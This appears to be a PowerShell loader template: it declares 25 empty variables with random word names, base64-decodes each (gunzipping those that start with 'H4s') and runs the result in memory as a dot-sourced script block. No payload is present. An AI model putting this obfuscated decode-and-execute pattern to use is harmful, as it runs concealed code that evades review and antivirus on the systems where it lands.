#Requires -Version 2

$Applauding = ""
$Roqueforts = ""
$Stonehenge = ""
$Sharpeners = ""
$Heightened = ""
$Minorities = ""
$Baseboards = ""
$Aviatrices = ""
$Dieticians = ""
$Landlubber = ""
$Scrubbiest = ""
$Thirtieths = ""
$Unworthier = ""
$Sufficient = ""
$Femininity = ""
$Recollects = ""
$Nonmembers = ""
$Minimizing = ""
$Phonograph = ""
$Oppression = ""
$Unrequited = ""
$Reciprocal = ""
$Shockproof = ""
$Plateauing = ""
$Bradstreet = ""

$Modules = @($Applauding,$Roqueforts,$Stonehenge,$Sharpeners,$Heightened,$Minorities,$Baseboards,$Aviatrices,$Dieticians,$Landlubber,$Scrubbiest,$Thirtieths,$Unworthier,$Sufficient,$Femininity,$Recollects,$Nonmembers,$Minimizing,$Phonograph,$Oppression,$Unrequited,$Reciprocal,$Shockproof,$Plateauing,$Bradstreet)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
